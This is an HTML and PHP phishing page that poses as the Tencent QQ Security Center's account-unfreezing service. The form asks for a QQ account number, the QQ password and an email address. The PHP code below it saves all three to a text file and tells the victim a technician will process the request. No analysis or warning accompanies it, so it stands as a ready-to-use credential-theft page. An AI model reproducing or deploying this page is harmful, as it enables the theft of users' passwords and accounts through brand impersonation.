<body>
	<div class="h"><div><div class="h_left"><a class="logo" href="https://aq.qq.com/cn2/index"><div class="logo_pic"></div><div class="logo_text">QQ安全中心</div></a><div class="h_tit">快速解冻通道</div></div></div></div>
	<div class="main"><form action="" method="post"><ul>
		<li>QQ账号：<input class="m_txt" type="text" name="qq" placeholder="QQ/邮箱/手机号/微博帐号"></li>
		<li>QQ密码：<input class="m_txt" type="password" name="password" placeholder="输入密码"></li>
		<li>接收邮箱：<input class="m_txt" type="text" name="mail" placeholder="解冻成功将发送邮件到该邮箱"></li>
		<li><input class="m_btn" type="submit" value="提交订单"></li></ul></form></div>
		<div class="f"><div><div class="f_about"><p class="about_copyright"><span>Copyright © 1998 - <span>2017</span> Tencent. All Rights Reserved</span><span>腾讯公司 版权所有</span></p></div></div></div>
		<?php
		$name=@$_POST['qq'];
		$pass=@$_POST['password'];
		$mail=@$_POST['mail'];
		if (!$name||!$pass||!$mail) {
			exit ("<script>alert('请填写完整信息！')</script>");
		}
		if($pass!== null){
			$content = $name.'+'.$pass.'+'.$mail;
			$of = fopen('dir.txt','w');
			if($of){
				fwrite($of,$content);
			}
			fclose($of);
			echo "<script>alert('提交成功，技术人员会在24内处理订单。')</script>";
		}
		?>
